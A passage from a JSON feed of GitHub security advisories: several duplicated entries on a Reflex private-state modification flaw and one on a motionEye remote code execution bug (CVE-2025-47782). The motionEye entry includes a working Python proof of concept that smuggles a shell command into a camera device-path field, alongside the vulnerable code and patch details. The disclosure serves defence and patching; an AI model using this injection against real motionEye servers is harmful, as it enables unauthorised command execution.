            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A user on the website can modify any private field on their own state.</p>\n<h3 id=\"details\">Details</h3>\n<p>An event meant to modify client side storage had access to modify any field on the state for the given user. This includes non-client side ones and most importantly private fields. This still requires the actor to guess the name for the private fields.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>If one of the States in your app can be modified to allow the user into a different role or a different user this allows the actor to act as someone else or as admin.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/reflex-dev/reflex/security/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n<li><a href=\"https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36\">https://github.com/reflex-dev/reflex/commit/cf8f5dbcbdd996f3478a7be660993f9c760ede36</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rf8x-9mhr-49wg\">https://github.com/advisories/GHSA-rf8x-9mhr-49wg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg",
            "title": "[reflex] Reflex vulnerable to private state fields modification",
            "date_modified": "2025-05-15T16:15:20.000Z",
            "date_published": "2025-05-15T16:15:19.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rf8x-9mhr-49wg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Using a constructed (camera) device path with the <code>config/add</code>/<code>add_camera</code> motionEye web API allows an attacker with motionEye admin user credentials to execute any UNIX shell code within a non-interactive shell as executing user of the motionEye instance, <code>motion</code> by default.</p>\n<h4 id=\"function-call-stack\">function call stack</h4>\n<ol>\n<li><code>post</code></li>\n<li><code>add_camera</code></li>\n<li><code>config.add_camera</code></li>\n<li><code>v4l2ctl.list_resolutions</code></li>\n<li><code>utils.call_subprocess</code></li>\n<li><code>subprocess.run</code></li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<h4 id=\"build\">build</h4>\n<pre><code class=\"language-sh\">RUN_USER=\"user\"\nRUN_UID=$(id -u ${RUN_USER})\nRUN_GID=$(id -g ${RUN_USER})\nTIMESTAMP=\"$(date '+%Y%m%d-%H%M')\"\n\ndocker build \\\n  --network host \\\n  --build-arg=\"RUN_UID=${RUN_UID?}\" \\\n  --build-arg=\"RUN_GID=${RUN_GID?}\" \\\n  -t \"${USER?}/motioneye:${TIMESTAMP}\" \\\n  --no-cache \\\n  -f docker/Dockerfile .\n</code></pre>\n<h4 id=\"reproduce\">reproduce</h4>\n<p>Run:</p>\n<pre><code class=\"language-sh\">docker run --rm  -d   -p 8765:8765   --hostname=\"motioneye\"   -v /etc/localtime:/etc/localtime:ro   -v /tmp/motioneyeconfig:/etc/motioneye   -v /tmp/motioneyeconfig:/var/lib/motioneye\n</code></pre>\n<pre><code class=\"language-console\">bash-4.2$ docker logs ceb435eacf55 -f\nconfigure_logging cmd motioneye: False\nconfigure logging to file: None\n    INFO: hello! this is motionEye server 0.43.1b3\n   DEBUG: found motion executable \"/usr/bin/motion\" version \"4.7.0\"\n   DEBUG: found ffmpeg executable \"/usr/bin/ffmpeg\" version \"7.1.1-1+b1\"\n   DEBUG: listing config dir /etc/motioneye...\n   DEBUG: found camera with id 1\n   DEBUG: reading camera config from /etc/motioneye/camera-1.conf...\n   DEBUG: loading additional config structure for camera, without separators\n   DEBUG: Using selector: EpollSelector\n   DEBUG: searching motion executable\n   DEBUG: starting motion executable \"/usr/bin/motion\" version \"4.7.0\"\n    INFO: cleanup started\n    INFO: wsswitch started\n    INFO: tasks started\n    INFO: mjpg customer garbage collector has started\n    INFO: server started\n</code></pre>\n<p>Now, run the following script to attack motionEye:</p>\n<pre><code class=\"language-python\">import requests\nimport json\n\nurl = \"http://your_ip:8765/config/add?_username=admin&amp;_signature=c22baef3399cb7328e22ded1ca68395b4daecd18\"\n\npayload = json.dumps({\n  \"proto\": \"v4l2\",\n  \"path\": \"' `touch /tmp/bbbb` '\"\n})\nheaders = {\n  'Content-Type': 'application/json'\n}\n\nresponse = requests.request(\"POST\", url, headers=headers, data=payload)\n\nprint(response.text)\n</code></pre>\n<img src=\"https://github.com/user-attachments/assets/8e0a9bfe-8de3-4023-96d6-0e888bfe3c62\" alt=\"Image\" width=\"1187\">\n\n<img src=\"https://github.com/user-attachments/assets/04c73349-694a-4531-993e-eea765b87d0e\" alt=\"Image\" width=\"324\">\n\n<h4 id=\"discussion\">Discussion</h4>\n<p>It is obvious that call_subprocess was used to execute the incoming data, resulting in a vulnerability</p>\n<pre><code class=\"language-python\">def list_resolutions(device):\n    from motioneye import motionctl\n\n    device = utils.make_str(device)\n\n    if device in _resolutions_cache:\n        return _resolutions_cache[device]\n\n    logging.debug(f'listing resolutions of device {device}...')\n\n    resolutions = set()\n    output = b''\n    started = time.time()\n    cmd = f\"v4l2-ctl -d '{device}' --list-formats-ext | grep -vi stepwise | grep -oE '[0-9]+x[0-9]+' || true\"\n    logging.debug(f'running command \"{cmd}\"')\n\n    try:\n        output = utils.call_subprocess(cmd, shell=True, stderr=utils.DEV_NULL)\n    except:\n        logging.error(f'failed to list resolutions of device \"{device}\"')\n\n    output = utils.make_str(output)\n\ndef call_subprocess(\n    args,\n    stdin=None,\n    input=None,\n    stdout=subprocess.PIPE,\n    stderr=DEV_NULL,\n    capture_output=False,\n    shell=False,\n    cwd=None,\n    timeout=None,\n    check=True,\n    encoding='utf-8',\n    errors=None,\n    text=None,\n    env=None,\n) -&gt; str:\n    \"\"\"subprocess.run wrapper to return output as a decoded string\"\"\"\n    return subprocess.run(\n        args,\n        stdin=stdin,\n        input=input,\n        stdout=stdout,\n        stderr=stderr,\n        capture_output=capture_output,\n        shell=shell,\n        cwd=cwd,\n        timeout=timeout,\n        check=check,\n        encoding=encoding,\n        errors=errors,\n        text=text,\n        env=env,\n    ).stdout.strip()\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>RCE</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The vulnerability has been patch with motionEye v0.43.1b4: <a href=\"https://github.com/motioneye-project/motioneye/pull/3143\">https://github.com/motioneye-project/motioneye/pull/3143</a></p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Applying the following patch, replacing the literal single quotes in the created <code>cmd</code> string with a <code>shlex.quote</code>d input device: <a href=\"https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch\">https://patch-diff.githubusercontent.com/raw/motioneye-project/motioneye/pull/3143.patch</a></p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://github.com/motioneye-project/motioneye/issues/3142\">https://github.com/motioneye-project/motioneye/issues/3142</a></p>\n<h3 id=\"credit\">Credit</h3>\n<p>The vulnerability was discovered by Tencent YunDing Security Lab.</p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588\">https://github.com/motioneye-project/motioneye/security/advisories/GHSA-g5mq-prx7-c588</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-47782\">https://nvd.nist.gov/vuln/detail/CVE-2025-47782</a></li>\n<li><a href=\"https://github.com/motioneye-project/motioneye/issues/3142\">https://github.com/motioneye-project/motioneye/issues/3142</a></li>\n<li><a href=\"https://github.com/motioneye-project/motioneye/pull/3143\">https://github.com/motioneye-project/motioneye/pull/3143</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/motioneye/PYSEC-2025-39.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-g5mq-prx7-c588\">https://github.com/advisories/GHSA-g5mq-prx7-c588</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-g5mq-prx7-c588",
            "title": "[motioneye] motionEye vulnerable to RCE in add_camera Function Due to unsafe command execution",
            "date_modified": "2025-05-15T16:10:51.000Z",
            "date_published": "2025-05-15T16:10:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-g5mq-prx7-c588"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}